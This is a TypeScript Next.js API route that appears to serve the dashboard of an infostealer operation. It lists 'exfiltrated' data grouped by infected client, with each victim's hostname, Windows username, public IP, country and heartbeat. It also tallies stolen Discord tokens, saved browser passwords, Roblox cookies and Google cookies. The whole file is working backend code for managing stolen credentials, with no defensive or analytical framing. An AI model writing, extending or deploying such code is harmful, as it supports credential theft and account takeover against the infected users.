import { NextResponse } from "next/server"
import { getServerSession } from "next-auth"
import { authOptions } from "@/lib/auth"
import { prisma } from "@/lib/prisma"

export async function GET() {
  try {
    const session = await getServerSession(authOptions)
    if (!session?.user) {
      return NextResponse.json({ error: "Unauthorized" }, { status: 401 })
    }
    const role = (session.user as any)?.role
    if (role !== "owner" && role !== "administrator") {
      return NextResponse.json({ error: "Forbidden" }, { status: 403 })
    }

    const allData = await prisma.exfiltratedData.findMany({
      include: {
        client: { select: { id: true, clientId: true, hostname: true, user: true, country: true, os: true, ipPublic: true, lastHeartbeat: true } },
      },
      orderBy: { createdAt: "desc" },
    })

    // Group by client
    const clients: Record<string, {
      id: string; clientId: string; hostname: string; sessionName: string;
      country: string | null; os: string | null; ipPublic: string | null; lastHeartbeat: string | null;
      data: any[]
    }> = {}

    allData.forEach((item: any) => {
      const cid = item.clientId
      if (!clients[cid]) {
        let sessionName = item.client?.hostname || item.client?.user || item.clientId?.substring(0, 8) || "Unknown"

        // Try to extract Windows username from system_info data
        const sysInfo = allData.find((d: any) => d.clientId === cid && d.type === "system_info")
        if (sysInfo) {
          try {
            const parsed = JSON.parse(sysInfo.data)
            if (parsed.username) sessionName = parsed.username
          } catch {}
        }

        clients[cid] = {
          id: item.client?.id || cid,
          clientId: item.client?.clientId || cid,
          hostname: item.client?.hostname || "",
          sessionName,
          country: item.client?.country || null,
          os: item.client?.os || null,
          ipPublic: item.client?.ipPublic || null,
          lastHeartbeat: item.client?.lastHeartbeat || null,
          data: [],
        }
      }
      clients[cid].data.push({
        id: item.id,
        type: item.type,
        source: item.source,
        data: item.data,
        createdAt: item.createdAt,
      })
    })

    // Sort by most recent data
    const sorted = Object.values(clients).sort((a, b) => {
      const aTime = a.data[0]?.createdAt ? new Date(a.data[0].createdAt).getTime() : 0
      const bTime = b.data[0]?.createdAt ? new Date(b.data[0].createdAt).getTime() : 0
      return bTime - aTime
    })

    // Stats
    const totalData = allData.length
    const totalClients = sorted.length
    const discordTokens = allData.filter((d: any) => d.type === "discord_token").length
    const browserPasswords = allData.filter((d: any) => d.type === "browser_passwords").length
    const robloxCookies = allData.filter((d: any) => d.type === "roblox_cookies").length
    const googleCookies = allData.filter((d: any) => d.type === "google_cookies").length

    return NextResponse.json({
      clients: sorted,
      stats: { totalData, totalClients, discordTokens, browserPasswords, robloxCookies, googleCookies },
    })
  } catch (error) {
    console.error("[DATABASE_GET]", error)
    return NextResponse.json({ error: "Internal error" }, { status: 500 })
  }
}
